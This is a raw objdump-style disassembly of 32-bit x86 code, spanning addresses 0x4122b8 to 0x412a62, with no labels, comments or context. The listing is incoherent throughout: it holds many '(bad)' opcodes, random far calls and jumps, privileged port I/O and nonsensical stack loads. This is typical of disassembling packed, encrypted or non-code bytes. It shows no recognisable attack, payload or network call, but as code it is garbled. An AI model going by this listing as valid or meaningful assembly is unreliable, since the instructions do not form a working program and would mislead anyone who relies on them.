  4122b8:	inc    edi
  4122b9:	retfw  
  4122bb:	mov    ch,0xd1
  4122bd:	fist   WORD PTR [ecx-0x22]
  4122c0:	mov    ebx,0xce0c8078
  4122c5:	xchg   ecx,eax
  4122c6:	or     BYTE PTR [edi-0x31],ah
  4122c9:	call   0x74a65b1e
  4122ce:	pop    edx
  4122cf:	adc    ebp,DWORD PTR [ebx+0x52]
  4122d2:	push   esi
  4122d3:	outs   dx,BYTE PTR ds:[esi]
  4122d4:	imul   ebp,DWORD PTR [esi+0x48],0x1b
  4122d8:	xchg   ebp,eax
  4122d9:	mov    eax,ds:0x7909f6ae
  4122de:	mov    al,dl
  4122e0:	mov    ecx,0x36535622
  4122e5:	ins    BYTE PTR es:[edi],dx
  4122e6:	mov    bh,0x12
  4122e8:	lds    ecx,FWORD PTR [eax]
  4122ea:	push   0x6a
  4122ec:	and    ebp,ecx
  4122ee:	stc    
  4122ef:	rol    DWORD PTR [esi+0x66],0x2f
  4122f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122f4:	add    al,0xed
  4122f6:	and    al,0x96
  4122f8:	(bad)  [esp+ecx*1+0x20]
  4122fc:	int    0xf0
  4122fe:	je     0x4122c4
  412300:	jle    0x41231e
  412302:	pop    esi
  412303:	mov    dh,0xb1
  412305:	out    dx,eax
  412306:	outs   dx,DWORD PTR ds:[esi]
  412307:	push   cs
  412308:	clc    
  412309:	pop    es
  41230a:	jbe    0x4122fb
  41230c:	jo     0x412389
  41230e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41230f:	pop    esp
  412310:	jbe    0x412311
  412312:	mov    bl,0xa8
  412314:	outs   dx,BYTE PTR ds:[esi]
  412315:	aaa    
  412316:	adc    DWORD PTR [ecx+0x592e6907],ebx
  41231c:	leave  
  41231d:	push   esp
  41231e:	imul   edx,ecx,0x21
  412321:	or     dh,BYTE PTR ds:0x1192886a
  412327:	and    eax,0x5af2aae5
  41232c:	es cmp eax,0x88859c5d
  412332:	mov    eax,ds:0x86043b79
  412337:	fsub   st,st(2)
  412339:	or     eax,0xc7b57694
  41233e:	mov    bl,0xf1
  412340:	pop    es
  412341:	je     0x575710b4
  412347:	mov    esp,0x19594db6
  41234c:	mov    al,0x9a
  41234e:	es loope 0x412319
  412351:	fsubr  QWORD PTR [ebx]
  412353:	dec    edx
  412354:	sbb    al,0xe4
  412356:	ja     0x41230b
  412358:	mov    bl,0x78
  41235a:	loop   0x412314
  41235c:	dec    edi
  41235d:	pop    ecx
  41235e:	pusha  
  41235f:	call   0x6463:0xa92184ed
  412366:	pushf  
  412367:	test   eax,0xadbe27e9
  41236c:	pushf  
  41236d:	shl    BYTE PTR [ebp-0x24],0x8d
  412371:	out    0x15,al
  412373:	xchg   ecx,eax
  412374:	cmp    DWORD PTR [edx+edx*1],eax
  412377:	mov    dl,0x64
  412379:	adc    BYTE PTR [eax-0x38],ah
  41237c:	outs   dx,BYTE PTR ds:[esi]
  41237d:	call   0x103a1a01
  412382:	(bad)  
  412383:	(bad)  
  412384:	sti    
  412385:	adc    DWORD PTR [edi+0x69],edi
  412388:	cld    
  412389:	jne    0x4123c5
  41238b:	sahf   
  41238c:	into   
  41238d:	mov    bh,0xd6
  41238f:	dec    edx
  412390:	loopne 0x412364
  412392:	pop    eax
  412393:	push   esp
  412394:	popa   
  412395:	jo     0x412367
  412397:	popa   
  412398:	stos   DWORD PTR es:[edi],eax
  412399:	mov    dl,0x84
  41239b:	pop    DWORD PTR [eax+0x56309ac1]
  4123a1:	aam    0x8f
  4123a3:	xor    al,0x48
  4123a5:	and    edx,edx
  4123a7:	adc    BYTE PTR [eax-0x4e21dd8f],dh
  4123ad:	sub    al,0xbf
  4123af:	fstp   DWORD PTR [eax-0x4829502b]
  4123b5:	ja     0x4123ec
  4123b7:	jecxz  0x4123f9
  4123b9:	jno    0x412359
  4123bb:	xchg   ebx,eax
  4123bc:	or     eax,0x26ef3077
  4123c1:	out    dx,eax
  4123c2:	xlat   BYTE PTR ds:[ebx]
  4123c3:	lods   eax,DWORD PTR ds:[esi]
  4123c4:	lahf   
  4123c5:	xor    BYTE PTR [eax-0x40],ch
  4123c8:	xor    eax,0xfb8f3514
  4123cd:	mov    dh,0x11
  4123cf:	jge    0x41244f
  4123d1:	out    0x83,al
  4123d3:	cmp    esi,DWORD PTR [esi]
  4123d5:	scas   eax,DWORD PTR es:[edi]
  4123d6:	adc    ecx,DWORD PTR [edi-0x58]
  4123d9:	loopne 0x4123f9
  4123db:	sub    eax,0x73465257
  4123e0:	pop    es
  4123e1:	sahf   
  4123e2:	jae    0x412417
  4123e4:	jno    0x41243b
  4123e6:	ins    BYTE PTR es:[edi],dx
  4123e7:	mov    ah,0x93
  4123e9:	jae    0x412426
  4123eb:	push   edx
  4123ec:	pop    esp
  4123ed:	or     eax,0x8c78f63
  4123f2:	jge    0x4123af
  4123f4:	push   edx
  4123f5:	xor    ebx,DWORD PTR [ebx]
  4123f7:	pop    esi
  4123f8:	fcom   DWORD PTR ds:0x2786f9f2
  4123fe:	sub    bh,ch
  412400:	and    DWORD PTR [ecx-0x1ddb63f8],edi
  412406:	lods   al,BYTE PTR ds:[esi]
  412407:	pop    edi
  412408:	cmp    ecx,ecx
  41240a:	mov    eax,ds:0xdfa2e7d0
  41240f:	inc    edx
  412410:	mov    ebp,0xa5548c35
  412415:	ins    DWORD PTR es:[edi],dx
  412416:	push   0x52c33584
  41241b:	fidivr DWORD PTR [esi+eax*8]
  41241e:	mov    esp,0x78c99bdc
  412423:	out    0xc4,eax
  412425:	setae  al
  412428:	into   
  412429:	aas    
  41242a:	fs je  0x4123b6
  41242d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41242e:	popf   
  41242f:	xchg   ebp,eax
  412430:	sbb    ebp,ebx
  412432:	popf   
  412433:	ja     0x412428
  412435:	fdiv   st(3),st
  412437:	ret    
  412438:	sbb    DWORD PTR [eax],ebx
  41243a:	xor    ebp,DWORD PTR [edx]
  41243c:	pop    ss
  41243d:	(bad)  
  41243f:	pop    ds
  412440:	xor    esi,eax
  412442:	hlt    
  412443:	dec    ebp
  412444:	pop    edi
  412445:	mov    ah,0xd6
  412447:	pop    eax
  412448:	jmp    0xc0a9e1e7
  41244d:	mov    edx,0x61ab5fa3
  412452:	xchg   ch,al
  412454:	test   BYTE PTR [ebx+eiz*8+0x594b18d6],dl
  41245b:	jecxz  0x412467
  41245d:	inc    ebx
  41245e:	dec    ebx
  41245f:	sti    
  412460:	add    BYTE PTR [edi-0x47],bl
  412463:	test   al,0x22
  412465:	loopne 0x41249a
  412467:	pop    ds
  412468:	mov    edi,0x5ea40af5
  41246d:	pop    es
  41246e:	jo     0x412409
  412470:	add    BYTE PTR [eax],0x62
  412473:	mov    DWORD PTR [ecx],ebx
  412475:	es mov bh,0x79
  412478:	mov    ebp,0xa18b6f24
  41247d:	out    dx,eax
  41247e:	ss jno 0x412494
  412481:	mov    ah,0x9d
  412483:	inc    ebp
  412484:	aad    0x51
  412486:	pop    edi
  412487:	sub    bh,BYTE PTR ds:0x18f1d298
  41248d:	outs   dx,DWORD PTR ds:[esi]
  41248e:	(bad)  
  41248f:	rcr    BYTE PTR [edx-0x301e37b9],1
  412495:	mov    al,BYTE PTR [esi]
  412497:	dec    esi
  412498:	pop    eax
  412499:	clc    
  41249a:	loopne 0x4124c6
  41249c:	jno    0x412437
  41249e:	xlat   BYTE PTR ds:[ebx]
  41249f:	jno    0x412481
  4124a1:	add    BYTE PTR [bp+0x1ac1],al
  4124a6:	jmp    0x26a9942
  4124ab:	mov    esp,0x9e95fb20
  4124b0:	leave  
  4124b1:	sbb    eax,0xd91b78da
  4124b6:	sub    ebp,DWORD PTR [edi]
  4124b8:	cmp    eax,0xa67636
  4124bd:	xchg   ecx,eax
  4124be:	xchg   esi,eax
  4124bf:	sbb    eax,0xd77ba4f4
  4124c4:	jb     0x4124f7
  4124c6:	fldenv [ebp+0x1ac6a02c]
  4124cc:	mov    cl,0x4e
  4124ce:	ins    BYTE PTR es:[edi],dx
  4124cf:	sub    al,0xf4
  4124d1:	mov    edx,0xaa2236ce
  4124d6:	fdivrp st(3),st
  4124d8:	mov    bl,0xda
  4124da:	xor    eax,0x8f702834
  4124df:	or     DWORD PTR [ebx+0x37],edi
  4124e2:	pushf  
  4124e3:	sbb    cl,ah
  4124e5:	pop    ebx
  4124e6:	sti    
  4124e7:	cmp    al,0x96
  4124e9:	sub    dh,0x88
  4124ec:	mov    bl,0x24
  4124ee:	sub    ebx,DWORD PTR [ebx+ecx*8]
  4124f1:	adc    al,0xb4
  4124f3:	mov    edx,0xa2462bb2
  4124f8:	ficomp DWORD PTR [ecx]
  4124fa:	je     0x412552
  4124fc:	and    al,0x21
  4124fe:	add    DWORD PTR [edx+0x47],0xabcff05c
  412505:	xor    BYTE PTR [edi+0x38],cl
  412508:	mov    DWORD PTR [esi],ecx
  41250a:	adc    bh,BYTE PTR [esi]
  41250c:	neg    DWORD PTR ds:0xa477a3ba
  412512:	fisttp DWORD PTR [edi-0x4efd2f85]
  412518:	inc    edi
  412519:	div    DWORD PTR [edi+0x4e]
  41251c:	sbb    DWORD PTR [ebx-0x3f7152db],ecx
  412522:	es xchg ebx,eax
  412524:	add    ebp,DWORD PTR [esi]
  412526:	ret    
  412527:	inc    ecx
  412528:	pop    ss
  412529:	mov    cl,0xe9
  41252b:	hlt    
  41252c:	push   edi
  41252d:	adc    bl,BYTE PTR [edx+0x3ed2fe64]
  412533:	ja     0x412511
  412535:	(bad)
  412539:	ret    
  41253a:	pop    ds
  41253b:	fld    DWORD PTR [bp+si+0xf61]
  412540:	inc    ebx
  412541:	cld    
  412542:	(bad)  
  412543:	imul   ecx,ebx,0xffffffbe
  412546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412547:	jbe    0x4124de
  412549:	cld    
  41254a:	mov    cs:0xb6affc85,eax
  412550:	outs   dx,DWORD PTR ds:[esi]
  412551:	out    dx,eax
  412552:	mov    esi,DWORD PTR ds:0x209b51f5
  412558:	adc    ecx,DWORD PTR [ebx+eiz*2]
  41255b:	mov    ebx,0xa30d638c
  412560:	lds    ecx,FWORD PTR ds:0x15a35bc
  412566:	push   0x51
  412568:	(bad)  
  412569:	mov    al,ds:0x2695e99b
  41256e:	fmulp  st(5),st
  412570:	inc    eax
  412571:	(bad)  
  412572:	cmp    dl,dl
  412574:	sbb    esi,ecx
  412576:	mov    dh,0x95
  412578:	sti    
  412579:	push   ebp
  41257a:	lods   al,BYTE PTR ds:[esi]
  41257b:	xor    DWORD PTR [edx+0x2a],0x98764590
  412582:	or     ah,BYTE PTR [esi-0x4d]
  412585:	jo     0x41258e
  412587:	aas    
  412588:	js     0x412546
  41258a:	add    DWORD PTR [edx-0x730fa43d],eax
  412590:	add    BYTE PTR [edi-0x6c],0x9c
  412594:	pop    ss
  412595:	(bad)  
  412596:	test   BYTE PTR [ebp+0x1f156c4c],0x23
  41259d:	cmp    bl,cl
  41259f:	add    eax,0x456a9074
  4125a4:	(bad)  
  4125a5:	jmp    0xe6738c2e
  4125aa:	ret    0xe109
  4125ad:	ret    0x3d24
  4125b0:	and    al,0x5e
  4125b2:	popf   
  4125b3:	(bad)  
  4125b5:	mov    ds:0x621fc059,al
  4125ba:	xor    edi,0xfffffff0
  4125bd:	test   eax,0xa67a98ee
  4125c2:	dec    ebx
  4125c3:	xor    ebx,0xffffff9c
  4125c6:	repnz stos BYTE PTR es:[edi],al
  4125c8:	xor    al,BYTE PTR [eax]
  4125ca:	(bad)  
  4125cb:	not    DWORD PTR [ebp-0x50938480]
  4125d1:	cdq    
  4125d2:	cwde   
  4125d3:	icebp  
  4125d4:	pop    ecx
  4125d5:	outs   dx,DWORD PTR ds:[esi]
  4125d6:	adc    al,0x78
  4125d8:	ins    BYTE PTR es:[edi],dx
  4125d9:	(bad)  
  4125da:	xor    BYTE PTR [esi+eax*8+0x56],ah
  4125de:	nop
  4125df:	mov    ecx,0x83d959dd
  4125e4:	mov    gs:0x9bcc6f87,eax
  4125ea:	mov    dl,0xfa
  4125ec:	mov    ah,0xa0
  4125ee:	xor    bl,0xa8
  4125f1:	pop    ss
  4125f2:	stos   BYTE PTR es:[edi],al
  4125f3:	popa   
  4125f4:	ror    BYTE PTR [ecx],1
  4125f6:	xchg   DWORD PTR [ecx+ecx*2+0x3c9e223c],ebx
  4125fd:	out    dx,al
  4125fe:	add    BYTE PTR [edi-0x51],bh
  412601:	lahf   
  412602:	jne    0x4125ed
  412604:	ins    DWORD PTR es:[edi],dx
  412605:	leave  
  412606:	std    
  412607:	cmp    BYTE PTR [ebx+0xdf5cd18],bh
  41260d:	sbb    BYTE PTR [ecx+edi*4+0xa],bh
  412611:	sub    DWORD PTR [ebx-0x4c],esi
  412614:	mov    BYTE PTR [ebp+eiz*8+0x21],ah
  412618:	std    
  412619:	jle    0x41261f
  41261b:	or     DWORD PTR [esi-0x2ecda505],edx
  412621:	das    
  412622:	stc    
  412623:	test   DWORD PTR [eax-0x4c],esp
  412626:	mov    dh,BYTE PTR [ebx+0x51]
  412629:	lods   al,BYTE PTR ds:[esi]
  41262a:	mov    ds:0xe6c39a4f,eax
  41262f:	xor    al,0x91
  412631:	cld    
  412632:	xor    BYTE PTR [edx+ebp*8-0x53176edf],0x6f
  41263a:	ret    
  41263b:	fnstcw WORD PTR [ebp+ebx*1+0x29]
  41263f:	jne    0x412688
  412641:	jne    0x412649
  412643:	push   0x671e221c
  412648:	mov    ah,0x74
  41264a:	cmc    
  41264b:	sbb    BYTE PTR cs:[edi],al
  41264e:	inc    edx
  41264f:	outs   dx,BYTE PTR ds:[esi]
  412650:	pop    ds
  412651:	cmp    ah,al
  412653:	sbb    ecx,eax
  412655:	test   al,0xc0
  412657:	adc    eax,0x29e631ad
  41265c:	outs   dx,DWORD PTR ds:[esi]
  41265d:	add    bh,BYTE PTR [eax-0x7c2f9984]
  412663:	sar    BYTE PTR [ebp+esi*1+0x3d2874d4],1
  41266a:	push   ebp
  41266b:	pop    ebp
  41266c:	mov    esp,0xe4af8bb1
  412671:	inc    ebp
  412672:	mov    dl,BYTE PTR [ecx+edx*8]
  412675:	mov    ebp,0x98b85f99
  41267a:	aad    0x8c
  41267c:	popa   
  41267d:	cdq    
  41267e:	(bad)  
  41267f:	xor    dh,BYTE PTR [edi+0x37]
  412682:	loope  0x412670
  412684:	push   edi
  412685:	inc    edx
  412686:	fcom   DWORD PTR [ebx+eax*8-0xa0b235a]
  41268d:	pop    edx
  41268e:	pop    esp
  41268f:	or     DWORD PTR ds:0xf67b0c34,eax
  412695:	jmp    0x889b27bc
  41269a:	shr    BYTE PTR [ebp-0x75],1
  41269d:	sahf   
  41269e:	jo     0x4126ed
  4126a0:	mov    esi,0xc7b05b94
  4126a5:	xchg   ebx,edx
  4126a7:	mov    ebp,0x88d12e0
  4126ac:	stc    
  4126ad:	retf   0x7ca8
  4126b0:	sti    
  4126b1:	add    BYTE PTR [ecx-0x62b2de83],cl
  4126b7:	mov    dl,BYTE PTR [edi+ebp*8-0x78]
  4126bb:	inc    esi
  4126bc:	mov    gs,WORD PTR [esp+edi*2-0x7f9d9ff6]
  4126c3:	shl    DWORD PTR [eax-0x21],1
  4126c6:	aad    0x99
  4126c8:	jnp    0x4126c3
  4126ca:	pop    edx
  4126cb:	push   edi
  4126cc:	ret    0x61ad
  4126cf:	stc    
  4126d0:	retf   0xef9
  4126d3:	xchg   edx,eax
  4126d4:	test   DWORD PTR [esi+0x79],0xc8293ba6
  4126db:	pop    esp
  4126dc:	mov    edi,0xd3936e18
  4126e1:	inc    eax
  4126e2:	inc    ebp
  4126e3:	dec    ecx
  4126e4:	pop    ecx
  4126e5:	mov    dh,0x9
  4126e7:	gs and eax,0x884f8826
  4126ed:	xor    DWORD PTR [ebx+0x13],edi
  4126f0:	int    0x84
  4126f2:	(bad)  
  4126f3:	or     al,0x2e
  4126f5:	ficomp DWORD PTR [ecx]
  4126f7:	int3   
  4126f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f9:	pushf  
  4126fa:	rcr    BYTE PTR [edi+edx*1],cl
  4126fd:	fidiv  DWORD PTR [edx-0x7a]
  412700:	repz jl 0x41273b
  412703:	pop    es
  412704:	fwait
  412705:	sbb    eax,0x12372c23
  41270a:	je     0x4126d4
  41270c:	in     eax,dx
  41270d:	xchg   edi,eax
  41270e:	and    al,0x67
  412710:	pop    esp
  412711:	fdiv   st,st(1)
  412713:	xchg   ecx,eax
  412714:	jl     0x41275a
  412716:	mov    ebx,DWORD PTR [ebx]
  412718:	jmp    0x35a3:0x104a09fe
  41271f:	jg     0x41276d
  412721:	pushf  
  412722:	or     BYTE PTR [ebx+0x17413280],bl
  412728:	stc    
  412729:	adc    al,0x88
  41272b:	mov    eax,ds:0xa83fa5bb
  412730:	jbe    0x4126e8
  412732:	mov    ebp,0xbb8e42b9
  412737:	and    eax,0x382e76ca
  41273c:	js     0x4126c4
  41273e:	loopne 0x4126c2
  412740:	jne    0x412707
  412742:	fst    QWORD PTR ds:[ebx-0xf]
  412746:	push   edx
  412747:	push   ds
  412748:	int3   
  412749:	cli    
  41274a:	call   0xcc09:0xd5fc93cd
  412751:	shr    dh,cl
  412753:	sbb    eax,0x212621e1
  412758:	adc    al,0x65
  41275a:	jbe    0x412733
  41275c:	pushf  
  41275d:	sbb    eax,0x4a1dc64a
  412762:	rol    DWORD PTR [edi],0x36
  412765:	pop    eax
  412766:	test   BYTE PTR [edx-0x40],bl
  412769:	mov    edi,cs
  41276b:	repz inc eax
  41276d:	dec    esp
  41276e:	mov    eax,ds:0xf084527b
  412773:	sub    ah,BYTE PTR [ebx+esi*1]
  412776:	stos   BYTE PTR es:[edi],al
  412777:	xchg   ebx,eax
  412778:	adc    BYTE PTR [edi],0x3
  41277b:	jle    0x4127bf
  41277d:	(bad)  
  41277e:	sbb    DWORD PTR [eax+0x39f3557],eax
  412784:	pop    es
  412785:	mov    bh,0x5f
  412787:	or     BYTE PTR [esi],ah
  412789:	lods   al,BYTE PTR ds:[esi]
  41278a:	xchg   ecx,eax
  41278b:	sbb    ch,BYTE PTR [eax-0x2bc21e4d]
  412791:	adc    edi,eax
  412793:	pop    ds
  412794:	sub    al,0x20
  412796:	sbb    al,0xc3
  412798:	test   cl,ch
  41279a:	mov    ds:0x4a9098e4,al
  41279f:	dec    DWORD PTR [edi]
  4127a1:	push   ds
  4127a2:	jae    0x4127c8
  4127a4:	pop    ebp
  4127a5:	dec    esi
  4127a6:	fsub   st(4),st
  4127a8:	or     BYTE PTR [esi+edi*1-0x52],cl
  4127ac:	adc    ebx,DWORD PTR [ecx-0x41]
  4127af:	fs in  al,0x74
  4127b2:	mov    WORD PTR ds:0x1cd2a84f,es
  4127b8:	jbe    0x4127a8
  4127ba:	push   ss
  4127bb:	pop    esi
  4127bc:	adc    eax,0xc66c6772
  4127c1:	cwde   
  4127c2:	jbe    0x412745
  4127c4:	dec    eax
  4127c5:	and    eax,0xb256248d
  4127ca:	shl    BYTE PTR [eax-0x602be428],0x54
  4127d1:	xchg   edi,eax
  4127d2:	aaa    
  4127d3:	sub    al,0x18
  4127d5:	lds    ebx,FWORD PTR [edi+esi*8-0x27]
  4127d9:	test   al,0xdd
  4127db:	std    
  4127dc:	inc    esi
  4127dd:	mov    ebp,0x65fab448
  4127e2:	stc    
  4127e3:	sbb    al,BYTE PTR [ebp+0x56]
  4127e6:	xor    al,0xb5
  4127e8:	repnz cdq 
  4127ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127eb:	(bad)  
  4127ec:	aad    0xcf
  4127ee:	jmp    esp
  4127f0:	outs   dx,BYTE PTR ds:[esi]
  4127f1:	test   al,0x3f
  4127f3:	inc    ebp
  4127f4:	fnstcw WORD PTR [edx-0x2b]
  4127f7:	fdiv   st(4),st
  4127f9:	add    ah,BYTE PTR [eax]
  4127fb:	dec    esp
  4127fc:	fld    TBYTE PTR [ecx-0x7e5483b5]
  412802:	lods   eax,DWORD PTR ds:[esi]
  412803:	repnz cmp bl,BYTE PTR ds:0x58975de8
  41280a:	ret    0xcc0f
  41280d:	xchg   edx,eax
  41280e:	mov    ebx,0xb5cbe4c6
  412813:	dec    ecx
  412814:	fst    st(7)
  412816:	pop    ss
  412817:	adc    dl,BYTE PTR [edx+0x33]
  41281a:	mov    eax,ds:0xe2731e20
  41281f:	enter  0xd98d,0x8
  412823:	push   esp
  412824:	and    eax,0x15b11d7a
  412829:	xchg   edi,eax
  41282a:	pop    ebp
  41282b:	aas    
  41282c:	or     eax,0x1915185d
  412831:	lods   al,BYTE PTR ds:[esi]
  412832:	sub    DWORD PTR [ebx+ecx*8],0x7b
  412836:	mov    al,0xd1
  412838:	ret    
  412839:	sar    BYTE PTR [ebx+0x3f857cb4],cl
  41283f:	or     BYTE PTR [esi+0x4c],dh
  412842:	xchg   BYTE PTR [ebx-0x16b07a77],ch
  412848:	ficomp WORD PTR [ecx]
  41284a:	mov    ch,0xfb
  41284c:	lds    edx,FWORD PTR [ebp-0x2e]
  41284f:	xchg   ebp,eax
  412850:	mov    ds:0x1e740cf2,al
  412855:	aaa    
  412856:	aam    0x41
  412858:	fistp  QWORD PTR [ecx]
  41285a:	inc    edi
  41285b:	push   ebx
  41285c:	push   edx
  41285d:	das    
  41285e:	fidiv  DWORD PTR [edi]
  412860:	xor    al,0x44
  412862:	sub    BYTE PTR [ebp+eax*2+0xb],dh
  412866:	jecxz  0x4128c8
  412868:	inc    edi
  412869:	ds jl  0x41286a
  41286c:	int3   
  41286d:	aad    0x5c
  41286f:	aad    0x42
  412871:	sub    ah,ch
  412873:	push   es
  412874:	test   DWORD PTR [esi-0x18],edi
  412877:	sbb    dh,BYTE PTR [eax]
  412879:	arpl   WORD PTR [eax+0x1d],si
  41287c:	bound  edx,QWORD PTR [edi-0x4f]
  41287f:	outs   dx,DWORD PTR ds:[esi]
  412880:	sub    DWORD PTR [ecx-0x32c0bccd],edi
  412886:	aaa    
  412887:	and    edi,DWORD PTR [edi-0x3e]
  41288a:	ret    0x93f2
  41288d:	jecxz  0x41288c
  41288f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412890:	pop    edi
  412891:	retf   0x5e8a
  412894:	jb     0x412909
  412896:	or     eax,eax
  412898:	mov    ah,0x52
  41289a:	hlt    
  41289b:	mov    al,0xfd
  41289d:	push   edi
  41289e:	clc    
  41289f:	fistp  DWORD PTR [ecx+0xadd83e9]
  4128a5:	add    al,0x53
  4128a7:	xchg   esp,eax
  4128a8:	(bad)  
  4128a9:	lock leave 
  4128ab:	push   edx
  4128ac:	push   edx
  4128ad:	lock fldenv [esi+edi*8+0xc]
  4128b2:	daa    
  4128b3:	push   ebx
  4128b4:	out    0x17,eax
  4128b6:	or     al,0x37
  4128b8:	ror    BYTE PTR [edx],cl
  4128ba:	mov    eax,0x971377e7
  4128bf:	xlat   BYTE PTR ds:[ebx]
  4128c0:	out    0x8c,al
  4128c2:	cmp    eax,0x76a4b5e
  4128c7:	test   DWORD PTR [esi],eax
  4128c9:	aam    0x5d
  4128cb:	dec    esi
  4128cc:	neg    ch
  4128ce:	retf   
  4128cf:	mov    ch,cl
  4128d1:	jno    0x4128f5
  4128d3:	es inc edi
  4128d5:	cld    
  4128d6:	ror    DWORD PTR [ebx+0x54],1
  4128d9:	fscale 
  4128db:	imul   ecx,DWORD PTR [ebx-0x6879ad8e],0xffffff9a
  4128e2:	mov    ch,BYTE PTR [ebx+0x69]
  4128e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128e6:	xor    ebp,ecx
  4128e8:	xor    bh,bl
  4128ea:	sub    eax,0x40ff1579
  4128ef:	push   cs
  4128f0:	pop    edx
  4128f1:	xchg   esp,eax
  4128f2:	ins    DWORD PTR es:[edi],dx
  4128f3:	xor    al,0x19
  4128f5:	mov    esi,0xa0b60ef
  4128fa:	xchg   esi,eax
  4128fb:	push   ss
  4128fc:	enter  0xf72,0xb0
  412900:	out    0xe9,al
  412902:	push   eax
  412903:	hlt    
  412904:	ins    DWORD PTR es:[edi],dx
  412905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412906:	sbb    BYTE PTR [esi],cl
  412908:	inc    ebp
  412909:	data16 add al,0x33
  41290c:	add    DWORD PTR [ecx],0xffffffb6
  41290f:	jg     0x41292a
  412911:	sbb    DWORD PTR [esi-0x76],esi
  412914:	ins    DWORD PTR es:[edi],dx
  412915:	pop    edi
  412916:	aaa    
  412917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412918:	enter  0xabbe,0x28
  41291c:	and    eax,0xafd91d14
  412921:	jge    0x41293e
  412923:	in     al,dx
  412924:	loopne 0x4128b6
  412926:	xchg   eax,ebx
  412928:	mov    edi,0x6165ae76
  41292d:	jne    0x412983
  41292f:	ss dec eax
  412931:	ja     0x4128b5
  412933:	repnz mov al,0x8e
  412936:	push   ecx
  412937:	sbb    esi,esp
  412939:	gs in  al,0x13
  41293c:	dec    esp
  41293d:	mov    BYTE PTR ds:0xc15fa5e1,0xa1
  412944:	adc    esp,DWORD PTR [ecx]
  412946:	push   ebx
  412947:	daa    
  412948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412949:	push   0x40
  41294b:	pop    ss
  41294c:	cmp    eax,0xf9360f3e
  412951:	ss mov ecx,0x978ddd46
  412957:	pop    esi
  412958:	inc    ecx
  412959:	fwait
  41295a:	(bad)  
  41295b:	push   esp
  41295c:	adc    DWORD PTR [ebx-0x1e],ecx
  41295f:	test   dh,dl
  412961:	inc    esp
  412962:	xchg   BYTE PTR [edi],cl
  412964:	or     al,0xee
  412966:	aaa    
  412967:	inc    ebx
  412968:	dec    edi
  412969:	dec    esi
  41296a:	mov    ah,0x98
  41296c:	pop    ss
  41296d:	sbb    BYTE PTR [ecx],dl
  41296f:	sar    DWORD PTR [ebp+ebp*8-0x43],cl
  412973:	add    edx,DWORD PTR [eax-0x4ed417f1]
  412979:	stc    
  41297a:	mov    esi,DWORD PTR [ebx]
  41297c:	adc    eax,ebx
  41297e:	mov    ch,0x36
  412980:	xor    DWORD PTR [ecx-0x3e],ebp
  412983:	sbb    al,0x60
  412985:	xadd   BYTE PTR [ebp-0x71],bl
  412989:	popf   
  41298a:	pushf  
  41298b:	shl    DWORD PTR [ecx+0x65],0x21
  41298f:	cmp    dl,BYTE PTR [esi+0x77]
  412992:	cmp    eax,0xb73a42d3
  412997:	lahf   
  412998:	push   ebx
  412999:	pop    ecx
  41299a:	cmp    BYTE PTR [edi-0x34b2f525],0x9a
  4129a1:	sahf   
  4129a2:	mov    dl,0xa4
  4129a4:	shl    ecx,cl
  4129a6:	pusha  
  4129a7:	ja     0x412979
  4129a9:	inc    edx
  4129aa:	test   DWORD PTR [edi],edx
  4129ac:	pop    esi
  4129ad:	enter  0x58bb,0x1c
  4129b1:	out    dx,al
  4129b2:	sub    al,0x1b
  4129b4:	pop    edi
  4129b5:	lea    ebx,[eax-0x38]
  4129b8:	add    eax,0xb1c7b933
  4129bd:	sbb    eax,0x8482c776
  4129c2:	jmp    0x4129fb
  4129c4:	cmp    ch,ah
  4129c6:	pop    edi
  4129c7:	inc    ebx
  4129c8:	imul   edi,DWORD PTR [ebx+0x38],0xf1c7016b
  4129cf:	jno    0x4129ae
  4129d1:	rcr    ch,1
  4129d3:	gs (bad) 
  4129d5:	add    ah,BYTE PTR [si-0x794f]
  4129da:	in     eax,dx
  4129db:	lock jmp 0x3877:0xce02cf96
  4129e3:	(bad)  
  4129e4:	xchg   ecx,eax
  4129e5:	inc    esp
  4129e6:	inc    esi
  4129e7:	push   esp
  4129e8:	(bad)  
  4129ea:	lea    di,[edx+ebp*2+0x3f]
  4129ef:	jbe    0x412989
  4129f1:	jae    0x412a4c
  4129f3:	es push ss
  4129f5:	mov    edi,0x7e60b5bd
  4129fa:	and    ah,0xea
  4129fd:	pop    ebx
  4129fe:	pmulhuw xmm2,XMMWORD PTR [di]
  412a03:	pop    ds
  412a04:	dec    esi
  412a05:	pop    edi
  412a06:	sub    edx,DWORD PTR cs:[eax]
  412a09:	mov    cl,0x7f
  412a0b:	not    DWORD PTR [eax]
  412a0d:	repz mov bl,0x6a
  412a10:	les    eax,FWORD PTR [edi-0x37f96e92]
  412a16:	(bad)  
  412a17:	jg     0x4129f1
  412a19:	out    0xcc,eax
  412a1b:	push   esp
  412a1c:	adc    eax,DWORD PTR [ebx]
  412a1e:	cmp    BYTE PTR [edx+0x56],al
  412a21:	or     al,al
  412a23:	loopne 0x412a8d
  412a25:	addr16 out 0xc,eax
  412a28:	ficom  WORD PTR [ebx]
  412a2a:	jg     0x412a6c
  412a2c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  412a2e:	jno    0x412a16
  412a30:	icebp  
  412a31:	mov    esi,0xbe28ca58
  412a36:	int    0xbb
  412a38:	cmp    bl,BYTE PTR [esp+ebp*8-0x70]
  412a3c:	sub    al,0xa8
  412a3e:	and    edi,esp
  412a40:	lods   al,BYTE PTR ds:[esi]
  412a41:	push   ds
  412a42:	xlat   BYTE PTR ds:[ebx]
  412a43:	shl    DWORD PTR [ebx-0x2deb5968],cl
  412a49:	adc    DWORD PTR [ecx-0x60],ebx
  412a4c:	push   esi
  412a4d:	clc    
  412a4e:	cs das 
  412a50:	or     al,0x6
  412a52:	mov    cl,0xf5
  412a54:	lods   al,BYTE PTR ds:[esi]
  412a55:	lds    esp,FWORD PTR [ebx+0x65f9e822]
  412a5b:	jl     0x412a28
  412a5d:	inc    edx
  412a5e:	xor    ah,BYTE PTR [esi-0x10]
  412a61:	out    dx,al
  412a62:	push   esi
